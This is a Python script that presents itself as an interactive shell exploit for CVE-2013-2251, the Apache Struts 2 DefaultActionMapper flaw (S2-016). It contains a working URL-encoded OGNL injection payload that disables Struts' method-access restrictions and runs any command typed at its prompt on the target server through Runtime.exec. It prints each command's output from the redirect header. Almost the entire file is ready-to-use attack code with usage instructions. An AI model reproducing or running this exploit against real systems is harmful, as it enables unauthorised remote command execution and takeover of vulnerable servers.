#!/usr/bin/python
#
# coding=utf-8

# Interactive Shell for CVE-2013-2251
#
# The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with
# "action:" or "redirect:", followed by a desired navigational target expression. This mechanism was intended to help with
# attaching navigational information to buttons within forms.
#
# https://struts.apache.org/docs/s2-016.html
#

import requests
import sys
import readline

# Disable SSL
requests.packages.urllib3.disable_warnings()

print("======================================================")
print("#    Struts 2 DefaultActionMapper Exploit [S2-016]   #")
print("#         Interactive Shell for CVE-2013-2251        #")
print("#              created by. fadelmuharam              #")
print("======================================================")
if len(sys.argv) == 2:
    target = sys.argv[1] # Payload
    first = target + "?redirect:$%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27"
    second = "%27%29.getInputStream%28%29%29%7D"
    loop = 1
    while loop == 1:
        cmd = input("$ ")
        while cmd.strip() == '':
            cmd = input("$ ")
        if cmd.strip() == '\q':
            print("Exiting...")
            sys.exit()
        try:
            theurl=first+cmd+second
            pwn=requests.get(theurl,verify=False, allow_redirects=False)
            print(pwn.headers['Location'])
        except Exception:
            print("Not Vuln! Exiting...")
            sys.exit()

else: 
    print("======================================================")
    print("#     Usage: python s2-016.py http://site.com        #")
    print("======================================================")
    sys.exit()
    
